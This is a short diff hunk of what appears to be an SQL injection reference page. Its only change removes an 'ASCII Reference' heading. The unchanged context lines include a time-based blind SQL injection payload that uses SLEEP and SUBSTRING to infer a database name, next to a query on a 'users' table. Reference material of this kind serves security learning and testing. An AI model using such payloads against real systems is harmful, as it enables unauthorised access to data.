@@ -30,4 +30,3 @@ WHERE table_name='users'
 1' AND IF(SUBSTRING(database(),1,1)='d',SLEEP(5),0)#
 ```
 
-## ASCII Reference
